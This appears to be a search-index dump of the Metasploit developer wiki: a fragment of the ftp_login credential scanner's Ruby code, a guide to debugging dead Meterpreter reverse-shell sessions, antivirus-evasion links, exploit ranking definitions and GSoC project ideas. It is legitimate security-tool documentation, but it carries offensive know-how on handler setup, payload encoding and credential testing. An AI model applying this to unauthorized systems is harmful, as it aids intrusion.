#{ result . credential } ( #{ result . status } : #{ result . proof } )\" end end end # Always check for anonymous access by pretending to be a browser. def anonymous_creds anon_creds = [ ] if datastore [ 'RECORD_GUEST' ] [ 'IEUser@' , 'User@' , 'mozilla@example.com' , 'chrome@example.com' ]. each do | password | anon_creds << Metasploit :: Framework :: Credential . new ( public : 'anonymous' , private : password ) end end anon_creds end def test_ftp_access ( user , scanner ) dir = Rex :: Text . rand_text_alpha ( 8 ) write_check = scanner . send_cmd ( [ 'MKD' , dir ] , true ) if write_check and write_check =~ /^2/ scanner . send_cmd ( [ 'RMD' , dir ] , true ) print_status ( \" #{ rhost } : #{ rport } - User ' #{ user } ' has READ/WRITE access\" ) return 'Read/Write' else print_status ( \" #{ rhost } : #{ rport } - User ' #{ user } ' has READ access\" ) return 'Read-only' end end end","title":"ftp_login final view"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/","text":"Dead shells. Nobody likes them. Yet, despite the advances made in the Metasploit stagers and Meterperter itself, we still see them regularly. There are many reasons why shells refuse to connect, or die after they're established. The goal of this post is to help people understand why . Hopefully, by the end, the most common causes will be understood, and users can fix things themselves. If there are cases that are missed in this post, then please let us know and we'll add them. Over time, this post should become a canonical resource for debugging sessions. Background Knowledge Requisite Reading Prior to diving into the possible breakages and their causes, it's important to have some background knowledge of stagers, and how Meterpreter works. Please be sure to read the following articles prior to reading the rest of this post: [[Meterpreter Stageless Mode]] - Covers the exploitation process, and how Meterpreter sessions are established. This is important because understanding how the different components interact, and what, allows for easier debugging later. [[Meterpreter Configuration]] - Covers how configuration works in Meterpreter. This is important because it highlights the separation of configuration in stagers and Meterpreter. This alone is the key to many breakages, especially in HTTP/S payloads. [[The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers]] - Covers the detail of HTTP/S based communications in the stagers and in Meterpreter itself. Stagers, Stages, and Handlers Each exploit and handler is made up of multiple things, and they're all independent: A Stager : This is the small bit of code that is first executed by the target. It contains it's own bundled implementation of a communications channel. It has the goal of establishing communication with Metasploit, downloading the stage , and invoking it. It has it's own configuration . A Stage : This is the second payload that is executed by the target. It is sent to the target via the communications channel that was opened by the stage . Once downloaded, it is invoked and from there it takes over. It has it's own configuration . A Handler : This is the code that runs on the attacker's machine. It is responsible for handling the attacker-side of the communications channel that is established by the stager . It is responsible for uploading the stage . It is responsible for handling communication between the attacker and the target once the stage has taken over from the stager. In some cases there might be multiple stages (as is the case with POSIX Meterpreter). This is called an intermediate stage. Usually these stages are slightly bigger than the stager and can do more work to help establish communications. In the context of this article, they aren't too important. The most important thing to remember is that both the stager and the stage have their own configurations that are independent . THE MOST COMMON cause of dead shells is the result of the stage not having the correct configuration (ie. it's different to that specified in the stager ). LHOST and LPORT Any user of Metasploit will tell you that they know what LHOST and LPORT mean, yet it's incredibly common to find out that their understanding isn't 100% correct. To prevent dead sessions that are related to misconfiguration of these values, we need to make sure we understand what they mean. LHOST LHOST is short for Local Host . This value represents the IP address or host name that stagers and stages should attempt to connect to. It is where the handler can be reached. This doesn't mean that this is where the handler actually exists . LHOST is a value that meaning from the perspective of the target machine. This value is passed along as part of the configuration for stagers and stages , and tells the target machine where to go to reach the handler, and so this has to map to a value that is reachable by the target . A handler obviously needs to listen on a host/IP for the incoming connection. In cases where the LHOST value (ie. the address that the target is able to reach) is the same as that which the host can listen on, no extra work has to be done. The LHOST value is used by the handler. However, if some kind of NAT or port forward is enabled, or if the handler is behind a firewall, etc, then setting LHOST isn't enough. In order to listen on the appropriate interface, another setting must be used called ReverseListenerBindHost . This value tells the handler to listen on a different interface/IP, but it doesn't change the fact that the LHOST value is given to the target when the stage is uploaded. In short, LHOST must always remain the IP/host that is routable from the target, and if this value is not the same as what the listener needs to bind to, then change the ReverseListenerBindHost value. If you're attacking something across the Internet and you specify an internal IP in LHOST , you're doing it wrong. LPORT The principles of LHOST / ReverseListenerBindHost can be applied to LPORT and ReverseListenerBindPort as well. If you have port forwarding in place, and your listener needs to bind to a different port, then you need to make use of the ReverseListenerBindPort setting. The classic example of this case is where an attacker wants to make use of port 443 , but rightfully doesn't want to run Metasploit as root just so they can directly bind to ports lower than 1024 . Instead, the set up a port forward (on their router, or using iptables ) so that 443 forwards to 8443 , with a goal of accepting connections on that port instead. To accommodate this scenario, the LHOST value must still contain 443 , as this is the port that the target machine needs to establish communications on; 443 is the value that needs to go out with the stager and the stage configurations. Metasploit needs to bind locally to port 8443 , and so the handler is configured so that ReverseListenerBindPort has this value instead. When the handler launches, it binds to 8443 and handles any connections it receives. When a stage is generated, it uses 443 from LHOST value to populate the configuration. If the attacker makes the mistake of either setting LPORT to 8443 , or leaving LPORT as 443 and not using ReverseListenerBindPort , then the result is either a dead shell after the first stage, or no connect back at all. Dead Shells - What to check for? Quick things to check Make sure that LHOST is set to a routable address from the target, and not a local listen address. Make sure that LPORT is set to the port number that the target needs to connect to. Make sure that ReverseListenerBindPort is set if port forwarding is enabled and the traffic is being routed to a different port. Make sure that your listener's configuration matches that of the target from an architecture perspective. If you mix x64 listeners with x86 payloads (and vice versa), things will go bad. Not so quick things to check If the target is running AntiVirus there's a chance that the stage (ie. metsrv ) is being caught while being uploaded. reverse_tcp and reverse_http stagers download metsrv without any encryption, and so the content of the DLL is visible to anything watching on the wire. reverse_https can still get caught in cases where AV is doing MITM content inspection. In this case, consider encoding your payloads, or if possible using stageless meterpreter instead. ... more to come ...","title":"Debugging Dead Meterpreter Sessions"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#background-knowledge","text":"","title":"Background Knowledge"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#requisite-reading","text":"Prior to diving into the possible breakages and their causes, it's important to have some background knowledge of stagers, and how Meterpreter works. Please be sure to read the following articles prior to reading the rest of this post: [[Meterpreter Stageless Mode]] - Covers the exploitation process, and how Meterpreter sessions are established. This is important because understanding how the different components interact, and what, allows for easier debugging later. [[Meterpreter Configuration]] - Covers how configuration works in Meterpreter. This is important because it highlights the separation of configuration in stagers and Meterpreter. This alone is the key to many breakages, especially in HTTP/S payloads. [[The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers]] - Covers the detail of HTTP/S based communications in the stagers and in Meterpreter itself.","title":"Requisite Reading"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#stagers-stages-and-handlers","text":"Each exploit and handler is made up of multiple things, and they're all independent: A Stager : This is the small bit of code that is first executed by the target. It contains it's own bundled implementation of a communications channel. It has the goal of establishing communication with Metasploit, downloading the stage , and invoking it. It has it's own configuration . A Stage : This is the second payload that is executed by the target. It is sent to the target via the communications channel that was opened by the stage . Once downloaded, it is invoked and from there it takes over. It has it's own configuration . A Handler : This is the code that runs on the attacker's machine. It is responsible for handling the attacker-side of the communications channel that is established by the stager . It is responsible for uploading the stage . It is responsible for handling communication between the attacker and the target once the stage has taken over from the stager. In some cases there might be multiple stages (as is the case with POSIX Meterpreter). This is called an intermediate stage. Usually these stages are slightly bigger than the stager and can do more work to help establish communications. In the context of this article, they aren't too important. The most important thing to remember is that both the stager and the stage have their own configurations that are independent . THE MOST COMMON cause of dead shells is the result of the stage not having the correct configuration (ie. it's different to that specified in the stager ).","title":"Stagers, Stages, and Handlers"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#lhost-and-lport","text":"Any user of Metasploit will tell you that they know what LHOST and LPORT mean, yet it's incredibly common to find out that their understanding isn't 100% correct. To prevent dead sessions that are related to misconfiguration of these values, we need to make sure we understand what they mean.","title":"LHOST and LPORT"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#lhost","text":"LHOST is short for Local Host . This value represents the IP address or host name that stagers and stages should attempt to connect to. It is where the handler can be reached. This doesn't mean that this is where the handler actually exists . LHOST is a value that meaning from the perspective of the target machine. This value is passed along as part of the configuration for stagers and stages , and tells the target machine where to go to reach the handler, and so this has to map to a value that is reachable by the target . A handler obviously needs to listen on a host/IP for the incoming connection. In cases where the LHOST value (ie. the address that the target is able to reach) is the same as that which the host can listen on, no extra work has to be done. The LHOST value is used by the handler. However, if some kind of NAT or port forward is enabled, or if the handler is behind a firewall, etc, then setting LHOST isn't enough. In order to listen on the appropriate interface, another setting must be used called ReverseListenerBindHost . This value tells the handler to listen on a different interface/IP, but it doesn't change the fact that the LHOST value is given to the target when the stage is uploaded. In short, LHOST must always remain the IP/host that is routable from the target, and if this value is not the same as what the listener needs to bind to, then change the ReverseListenerBindHost value. If you're attacking something across the Internet and you specify an internal IP in LHOST , you're doing it wrong.","title":"LHOST"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#lport","text":"The principles of LHOST / ReverseListenerBindHost can be applied to LPORT and ReverseListenerBindPort as well. If you have port forwarding in place, and your listener needs to bind to a different port, then you need to make use of the ReverseListenerBindPort setting. The classic example of this case is where an attacker wants to make use of port 443 , but rightfully doesn't want to run Metasploit as root just so they can directly bind to ports lower than 1024 . Instead, the set up a port forward (on their router, or using iptables ) so that 443 forwards to 8443 , with a goal of accepting connections on that port instead. To accommodate this scenario, the LHOST value must still contain 443 , as this is the port that the target machine needs to establish communications on; 443 is the value that needs to go out with the stager and the stage configurations. Metasploit needs to bind locally to port 8443 , and so the handler is configured so that ReverseListenerBindPort has this value instead. When the handler launches, it binds to 8443 and handles any connections it receives. When a stage is generated, it uses 443 from LHOST value to populate the configuration. If the attacker makes the mistake of either setting LPORT to 8443 , or leaving LPORT as 443 and not using ReverseListenerBindPort , then the result is either a dead shell after the first stage, or no connect back at all.","title":"LPORT"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#dead-shells-what-to-check-for","text":"","title":"Dead Shells - What to check for?"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#quick-things-to-check","text":"Make sure that LHOST is set to a routable address from the target, and not a local listen address. Make sure that LPORT is set to the port number that the target needs to connect to. Make sure that ReverseListenerBindPort is set if port forwarding is enabled and the traffic is being routed to a different port. Make sure that your listener's configuration matches that of the target from an architecture perspective. If you mix x64 listeners with x86 payloads (and vice versa), things will go bad.","title":"Quick things to check"},{"location":"dev/dark/Debugging-Dead-Meterpreter-Sessions/#not-so-quick-things-to-check","text":"If the target is running AntiVirus there's a chance that the stage (ie. metsrv ) is being caught while being uploaded. reverse_tcp and reverse_http stagers download metsrv without any encryption, and so the content of the DLL is visible to anything watching on the wire. reverse_https can still get caught in cases where AV is doing MITM content inspection. In this case, consider encoding your payloads, or if possible using stageless meterpreter instead. ... more to come ...","title":"Not so quick things to check"},{"location":"dev/dark/Definition-of-Module-Reliability,-Side-Effects,-and-Stability/","text":"Stability Constant Description CRASH_SAFE Module should not crash the service or OS CRASH_SERVICE_RESTARTS Module may crash the service, but it will restart CRASH_SERVICE_DOWN Module may crash the service, and remain down CRASH_OS_RESTARTS Module may crash the OS, but it will restart CRASH_OS_DOWN Module may crash the OS, and remain down SERVICE_RESOURCE_LOSS Module causes a resource to be unavailable for the service OS_RESOURCE_LOSS Module causes a resource to be unavailable for the OS Side Effects Constant Description ARTIFACTS_ON_DISK Module leaves a payload, a dropper, etc, on the target machine CONFIG_CHANGES Module modifies some config file IOC_IN_LOGS Module leaves an indicator of compromise in the log(s) ACCOUNT_LOCKOUTS Module may cause an account to lock out SCREEN_EFFECTS Module shows something on the screen that a human may notice PHYSICAL_EFFECTS Module may produce physical effects in hardware (Examples: light, sound, or heat) AUDIO_EFFECTS Module may cause a noise (Examples: Audio output from the speakers or hardware beeps) Reliability Constant Description FIRST_ATTEMPT_FAIL The module may fail for the first attempt REPEATABLE_SESSION The module is expected to get a session every time it runs UNRELIABLE_SESSION The module isn't expected to get a shell reliably (such as only once)","title":"Definition of Module Reliability, Side Effects, and Stability"},{"location":"dev/dark/Evading-Anti-Virus/","text":"Evading Anti Virus Read these links http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/ http://schierlm.users.sourceforge.net/avevasion.html http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/ There are approximately 14 million other resources out there on the why's and wherefores of evading antivirus, but the about articles should get you started.","title":"Evading Anti Virus"},{"location":"dev/dark/Evading-Anti-Virus/#evading-anti-virus","text":"","title":"Evading Anti Virus"},{"location":"dev/dark/Evading-Anti-Virus/#read-these-links","text":"http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/ http://schierlm.users.sourceforge.net/avevasion.html http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/ There are approximately 14 million other resources out there on the why's and wherefores of evading antivirus, but the about articles should get you started.","title":"Read these links"},{"location":"dev/dark/Exploit-Ranking/","text":"Every exploit module has been assigned a rank based on its potential impact to the target system. Users can search, categorize, and prioritize exploits based on rankings. The ranking is implemented by adding a Rank constant at the top of the class declaration in a module: class MetasploitModule < Msf :: Exploit Rank = LowRanking def initialize ( info = {}) ... end ... end The ranking values are one of the following, in descending order of reliability: Ranking Description ExcellentRanking The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances ( WMF Escape() ). GreatRanking The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check. GoodRanking The exploit has a default target and it is the \"common case\" for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). NormalRanking The exploit is otherwise reliable, but depends on a specific version and can't (or doesn't) reliably autodetect. AverageRanking The exploit is generally unreliable or difficult to exploit. LowRanking The exploit is nearly impossible to exploit (or under 50% success rate) for common platforms. ManualRanking The exploit is unstable or difficult to exploit and is basically a DoS. This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval ). The ranking value is available the module Class object as well as instances: modcls = framework . exploits [ \"windows/browser/ie_createobject\" ] modcls . rank # => 600 modcls . rank_to_s # => \"excellent\" mod = modcls . new mod . rank # => 600 mod . rank_to_s # => \"excellent\"","title":"Exploit Ranking"},{"location":"dev/dark/GSoC-2017-Mentor-Organization-Application/","text":"This is how the application was submitted on 2017-02-08. Please make no more edits -- Please don't use markdown here, we have to paste it into a form. All answers are limited to 1000 chars. -- Why does your org want to participate in Google Summer of Code? The story of Metasploit Framework\u2019s creation and development over the last 13 years is one of community collaboration to create and hone tools useful to a wide range of security practitioners. Its broad functionality, combined with the deep domain knowledge of the mentors, offers a unique opportunity for students to learn about security and exploit development. Many of our contributors are established exploit developers and penetration testers who have years of industry experience that they can share with students. We hope that the experience will inspire students to continue contributing to open source security, as well as providing them with invaluable real-world training in development, security, and remote collaboration. How will you keep mentors engaged with their students? All of our mentors are long-time development team members who have a history of helping new users and contributors. Many of our mentors specialize in certain parts of the framework, so depending on the student's interests, we will match them with the most complementary mentor. Our project administrators will regularly check in with mentors and students to ensure that the relationship is productive and progressing as expected. How will you help your students stay on schedule to complete their projects? First, we will ask students to use GitHub's Projects to track progress in real time as they are working. Mentors will help students divide projects into manageable chunks with measurable milestones. This will help students learn how to manage and break up tasks on large scale projects. Additionally, students and mentors will need to collaborate on a weekly status report that describes their progress and send it to the mailing list. How will you get your students involved in your community during GSoC? Students will use the same channels that all our contributors use: IRC and GitHub. Students will follow the same procedures of code review that all our contributors follow. By providing them with the same communication channels that our community uses, we hope to encourage the students to interact and collaborate with other contributors and users and to explore additional resources beyond their mentor. Hopefully, this process will give them a network of support and illustrate the advantages of working with other minds. How will you keep students involved with your community after GSoC? Based on the success of the project, we will encourage students to apply for committer rights at the conclusion of GSoC, include them in Metasploit roadmap discussions, and invite them to special community events. After the conclusion of GSoC we will encourage students to write about their experience on Metasploit's community blog, which will give their work greater exposure to the overall security community.","title":"GSoC 2017 Mentor Organization Application"},{"location":"dev/dark/GSoC-2017-Mentor-Organization-Application/#this-is-how-the-application-was-submitted-on-2017-02-08-please-make-no-more-edits","text":"-- Please don't use markdown here, we have to paste it into a form. All answers are limited to 1000 chars. -- Why does your org want to participate in Google Summer of Code? The story of Metasploit Framework\u2019s creation and development over the last 13 years is one of community collaboration to create and hone tools useful to a wide range of security practitioners. Its broad functionality, combined with the deep domain knowledge of the mentors, offers a unique opportunity for students to learn about security and exploit development. Many of our contributors are established exploit developers and penetration testers who have years of industry experience that they can share with students. We hope that the experience will inspire students to continue contributing to open source security, as well as providing them with invaluable real-world training in development, security, and remote collaboration. How will you keep mentors engaged with their students? All of our mentors are long-time development team members who have a history of helping new users and contributors. Many of our mentors specialize in certain parts of the framework, so depending on the student's interests, we will match them with the most complementary mentor. Our project administrators will regularly check in with mentors and students to ensure that the relationship is productive and progressing as expected. How will you help your students stay on schedule to complete their projects? First, we will ask students to use GitHub's Projects to track progress in real time as they are working. Mentors will help students divide projects into manageable chunks with measurable milestones. This will help students learn how to manage and break up tasks on large scale projects. Additionally, students and mentors will need to collaborate on a weekly status report that describes their progress and send it to the mailing list. How will you get your students involved in your community during GSoC? Students will use the same channels that all our contributors use: IRC and GitHub. Students will follow the same procedures of code review that all our contributors follow. By providing them with the same communication channels that our community uses, we hope to encourage the students to interact and collaborate with other contributors and users and to explore additional resources beyond their mentor. Hopefully, this process will give them a network of support and illustrate the advantages of working with other minds. How will you keep students involved with your community after GSoC? Based on the success of the project, we will encourage students to apply for committer rights at the conclusion of GSoC, include them in Metasploit roadmap discussions, and invite them to special community events. After the conclusion of GSoC we will encourage students to write about their experience on Metasploit's community blog, which will give their work greater exposure to the overall security community.","title":"This is how the application was submitted on 2017-02-08. Please make no more edits"},{"location":"dev/dark/GSoC-2017-Project-Ideas/","text":"GSoC Project Ideas in no particular order. When you've picked one, take a look at [[GSoC-2017-Student-Proposal]] for how to make a proposal. Submit your own If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. -- Console side Convert between CMD_UNIX and the interpreted language architectures Perl, Python, and Ruby scripts can all be run via a short command line invocation. It would be nice to be able to use these payloads in ARCH_CMD contexts as well as their own separate architectures ( ARCH_PYTHON , ARCH_RUBY ). This would allow modules that exploit command injection vulnerabilities to use python meterpreter in particular. Difficulty : \u2158 Requirements : Ruby, Python, bash/sh Mentor : @wvu @sempervictus Automated exploit reliability scoring Automatically run a module over and over, determine success rates. Mentor : @busterb Exploit regression testing Set up automated testing using something like Vagrant to spin up and configure vulnerable machines, run exploits against them. A categorical focus Something like \"make all X exploits badass\", or add a full suite of modules around particular gear or vendor stack. Requirements : Ruby Mentor : @hdm Allow post modules to take a payload As it stands, the framework defines anything that takes a payload to be an exploit. Because post-exploitation modules cannot take a payload, things that want to drop an executable for persistence are implemented as local exploits (in the exploit/*/local namespace instead of post/*/persistence ). This project would give those kinds of modules a more consistent interface. Once this is done, we can move the exploit/*/local modules that aren't actually exploits back to post/ Difficulty : \u2157 Requirements : Ruby Mentor : @egypt SMB2 support (see also ruby_smb project ) Difficulty : 5/5 Mentor : @egypt Filesystem sessions The idea here is to create a new session type for authenticated protocols that give you filesystem access. The simplest is FTP, so that's where we should start. We'll need several pieces for this to work: A new session interface in Msf::Sessions ( lib/msf/base/sessions/ ). This should be abstract enough that we can implement protocols other than FTP in the future. A mapping of protocol details to that interface. A new command dispatcher implementing at least these commands: upload , download , ls , cd We'll need to modify auxiliary/scanner/ftp/ftp_login to create one of these awesome new sessions when authentication is successful. Difficulty : \u2156 Requirements : Ruby SMB-based file transport for Meterpreter The idea here is to create a transport that allows Meterpreter and Console to talk via File handles opened via UNC path. In cases where 445 is allowed outbound, Meterpreter can open file handles to a UNC path that MSF is listening on, and they can communicate on those file handles. For this to work we need: A new transport that knows how to operate over SMB file handles In particular, one file handle is used for writing, and one for reading. New stagers that use the Win32 API to open file handles to a given UNC path. Most of this is already done in a PR for named pipe transport support, and so a few changes to those stagers should result in it working fine for this. To come up with a method/protocol that both Console and Meterpreter can use to identify when new sessions come in. Given that SMB file reading and writing is already a thing, this shouldn't be too hard on the MSF side. Difficulty : \u2157 Requirements : Ruby & SMB Mentor : @OJ and/or @egypt -- Payload side Malleable HTTP/S C2 for Meterpreter Currently, the attributes that one can set for how a Meterpreter payload appears at the HTTP level are limited. We would like the ability to set and add arbitrary HTTP headers to requests and responses, so that the traffic appears more realistic. Difficulty : 5/5 Requirements : C, Ruby. Bonus: Python, PHP Mentor : @busterb Asynchronous victim-side scripting Using either Python or Powershell (or maybe both if it can be abstract enough). This could allow things like running Responder.py or Empire on a compromised host. Difficulty : \u2158 Requirements : C, Python/Powershell Mentor : @OJ Use SChannel in native Windows Meterpreter instead of embedded OpenSSL SChannel is Windows' built-in TLS library. Difficulty : \u2157 Requirements : C, Windows systems programming Mentor : @OJ SMB-based file transport for Meterpreter This is the Meterpreter side of the SMB transport mentioned in the Console section. For this to work we need: A new Meterpreter transport that uses file handles to read and write data over SMB to talk to MSF. Use the named pipe transport PR to see how this might work. Full support of the \"protocol\" that has been designed so that MSF knows when sessions come in. Difficulty : \u2156 Requirements : C, Windows systems programming Mentor : @OJ -- Metasploitable3 Metasploitable3 is an intentionally vulnerable virtual machine. It was created to be a learning tool for new users as well as a place to test Metasploit and its payloads. Linux: add vulnerabilities Requirements : Vagrant Windows: add vulnerabilities Requirements : Vagrant -- Miscellaneous Replace msftidy with a real linter Our current module style checker is a mass of regular expressions attempting to look for bad patterns. It could be much improved by using a real lexer. We could use rubocop as a base for this. This could also dovetail into an ongoing documentation project. Difficulty : \u2156 Requirements : Ruby Potential Mentors All of the following folks have expressed willingness to be mentors. @busterb @egypt @hdm @jhart-r7 @jinq102030 @mubix @OJ @sempervictus @wvu @zeroSteiner","title":"GSoC 2017 Project Ideas"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#submit-your-own","text":"If you want to suggest your own idea, please discuss it with us first on our mailing list to make sure it is a reasonable amount of work for a summer and that it fits the goals of the project. --","title":"Submit your own"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#console-side","text":"","title":"Console side"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#convert-between-cmd_unix-and-the-interpreted-language-architectures","text":"Perl, Python, and Ruby scripts can all be run via a short command line invocation. It would be nice to be able to use these payloads in ARCH_CMD contexts as well as their own separate architectures ( ARCH_PYTHON , ARCH_RUBY ). This would allow modules that exploit command injection vulnerabilities to use python meterpreter in particular. Difficulty : \u2158 Requirements : Ruby, Python, bash/sh Mentor : @wvu @sempervictus","title":"Convert between CMD_UNIX and the interpreted language architectures"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#automated-exploit-reliability-scoring","text":"Automatically run a module over and over, determine success rates. Mentor : @busterb","title":"Automated exploit reliability scoring"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#exploit-regression-testing","text":"Set up automated testing using something like Vagrant to spin up and configure vulnerable machines, run exploits against them.","title":"Exploit regression testing"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#a-categorical-focus","text":"Something like \"make all X exploits badass\", or add a full suite of modules around particular gear or vendor stack. Requirements : Ruby Mentor : @hdm","title":"A categorical focus"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#allow-post-modules-to-take-a-payload","text":"As it stands, the framework defines anything that takes a payload to be an exploit. Because post-exploitation modules cannot take a payload, things that want to drop an executable for persistence are implemented as local exploits (in the exploit/*/local namespace instead of post/*/persistence ). This project would give those kinds of modules a more consistent interface. Once this is done, we can move the exploit/*/local modules that aren't actually exploits back to post/ Difficulty : \u2157 Requirements : Ruby Mentor : @egypt","title":"Allow post modules to take a payload"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#smb2-support","text":"(see also ruby_smb project ) Difficulty : 5/5 Mentor : @egypt","title":"SMB2 support"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#filesystem-sessions","text":"The idea here is to create a new session type for authenticated protocols that give you filesystem access. The simplest is FTP, so that's where we should start. We'll need several pieces for this to work: A new session interface in Msf::Sessions ( lib/msf/base/sessions/ ). This should be abstract enough that we can implement protocols other than FTP in the future. A mapping of protocol details to that interface. A new command dispatcher implementing at least these commands: upload , download , ls , cd We'll need to modify auxiliary/scanner/ftp/ftp_login to create one of these awesome new sessions when authentication is successful. Difficulty : \u2156 Requirements : Ruby","title":"Filesystem sessions"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#smb-based-file-transport-for-meterpreter","text":"The idea here is to create a transport that allows Meterpreter and Console to talk via File handles opened via UNC path. In cases where 445 is allowed outbound, Meterpreter can open file handles to a UNC path that MSF is listening on, and they can communicate on those file handles. For this to work we need: A new transport that knows how to operate over SMB file handles In particular, one file handle is used for writing, and one for reading. New stagers that use the Win32 API to open file handles to a given UNC path. Most of this is already done in a PR for named pipe transport support, and so a few changes to those stagers should result in it working fine for this. To come up with a method/protocol that both Console and Meterpreter can use to identify when new sessions come in. Given that SMB file reading and writing is already a thing, this shouldn't be too hard on the MSF side. Difficulty : \u2157 Requirements : Ruby & SMB Mentor : @OJ and/or @egypt --","title":"SMB-based file transport for Meterpreter"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#payload-side","text":"","title":"Payload side"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#malleable-https-c2-for-meterpreter","text":"Currently, the attributes that one can set for how a Meterpreter payload appears at the HTTP level are limited. We would like the ability to set and add arbitrary HTTP headers to requests and responses, so that the traffic appears more realistic. Difficulty : 5/5 Requirements : C, Ruby. Bonus: Python, PHP Mentor : @busterb","title":"Malleable HTTP/S C2 for Meterpreter"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#asynchronous-victim-side-scripting","text":"Using either Python or Powershell (or maybe both if it can be abstract enough). This could allow things like running Responder.py or Empire on a compromised host. Difficulty : \u2158 Requirements : C, Python/Powershell Mentor : @OJ","title":"Asynchronous victim-side scripting"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#use-schannel-in-native-windows-meterpreter-instead-of-embedded-openssl","text":"SChannel is Windows' built-in TLS library. Difficulty : \u2157 Requirements : C, Windows systems programming Mentor : @OJ","title":"Use SChannel in native Windows Meterpreter instead of embedded OpenSSL"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#smb-based-file-transport-for-meterpreter_1","text":"This is the Meterpreter side of the SMB transport mentioned in the Console section. For this to work we need: A new Meterpreter transport that uses file handles to read and write data over SMB to talk to MSF. Use the named pipe transport PR to see how this might work. Full support of the \"protocol\" that has been designed so that MSF knows when sessions come in. Difficulty : \u2156 Requirements : C, Windows systems programming Mentor : @OJ --","title":"SMB-based file transport for Meterpreter"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#metasploitable3","text":"Metasploitable3 is an intentionally vulnerable virtual machine. It was created to be a learning tool for new users as well as a place to test Metasploit and its payloads.","title":"Metasploitable3"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#linux-add-vulnerabilities","text":"Requirements : Vagrant","title":"Linux: add vulnerabilities"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#windows-add-vulnerabilities","text":"Requirements : Vagrant --","title":"Windows: add vulnerabilities"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#replace-msftidy-with-a-real-linter","text":"Our current module style checker is a mass of regular expressions attempting to look for bad patterns. It could be much improved by using a real lexer. We could use rubocop as a base for this. This could also dovetail into an ongoing documentation project. Difficulty : \u2156 Requirements : Ruby","title":"Replace msftidy with a real linter"},{"location":"dev/dark/GSoC-2017-Project-Ideas/#potential-mentors","text":"All of the following folks have expressed willingness to be mentors. @busterb @egypt @hdm @jhart-r7 @jinq102030 @mubix @OJ @sempervictus @wvu @zeroSteiner","title":"Potential Mentors"},{"location":"dev/dark/GSoC-2017-Student-Proposal/","text":"Send the following to msfdev@metasploit.com Title A brief description of what you would like to work on. See [[GSoC-2017-Project-Ideas]] for ideas. Vitals Your name Contact info - include at least: an email address github user name Freenode nick Skillz What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before? Your project Fill in the details. What exactly do you want to accomplish?","title":"GSoC 2017 Student Proposal"},{"location":"dev/dark/GSoC-2017-Student-Proposal/#title","text":"A brief description of what you would like to work on. See [[GSoC-2017-Project-Ideas]] for ideas.","title":"Title"},{"location":"dev/dark/GSoC-2017-Student-Proposal/#vitals","text":"Your name Contact info - include at least: an email address github user name Freenode nick","title":"Vitals"},{"location":"dev/dark/GSoC-2017-Student-Proposal/#skillz","text":"What programming languages are you familiar with, in order of proficiency? Most of Metasploit is written in Ruby; for any project you will most likely need at least a passing knowledge of it. If you want to work on Meterpreter or Mettle, C will be necessary as well. What other projects have you worked on before?","title":"Skillz"},{"location":"dev/dark/GSoC-2017-Student-Proposal/#your-project","text":"Fill in the details. What exactly do you want to accomplish?","title":"Your project"},{"location":"dev/dark/GSoC-2018-Project-Ideas/","text":"GSoC Project Ideas in no particular order. When you've picked one, take a look at [[GSoC-2018-Student-Proposal]] for how to make a proposal. Mentors: @busterb, @zerosteiner, @timwr, @asoto-r7, @jmartin-r7, @pbarry-r7, @mkienow-r7, @jbarnett-r7 Enhance Metasploit Framework Improving the Post-exploit / Meterpreter functionality Examples could include: * Sending keystrokes and mouse movement to a Meterpreter session * HTML based VNC style session control e.g https://github.com/rapid7/metasploit-framework/pull/9196 but accepting user input from the browser * Playing (streaming?) sounds to a Meterpreter session * Implementing the streaming record mechanism from more Meterpreter sessions * Text-to-speech and volume control * Fun behaviors - Ejecting the CD-ROM drive - Flipping the screen upside down - Changing screen colors - Turning the monitor on/off - Ordering donuts * MessageBox or live chat functionality (e.g \"This machine is vulnerable to MS17-010, you must run Windows Update!\") * Overlaying an image or even HTML on the user interface Difficulty: Varies Improving post-exploit API to be more consistent, work smoothly across session types The Metasploit post-exploitation API is intended to provide 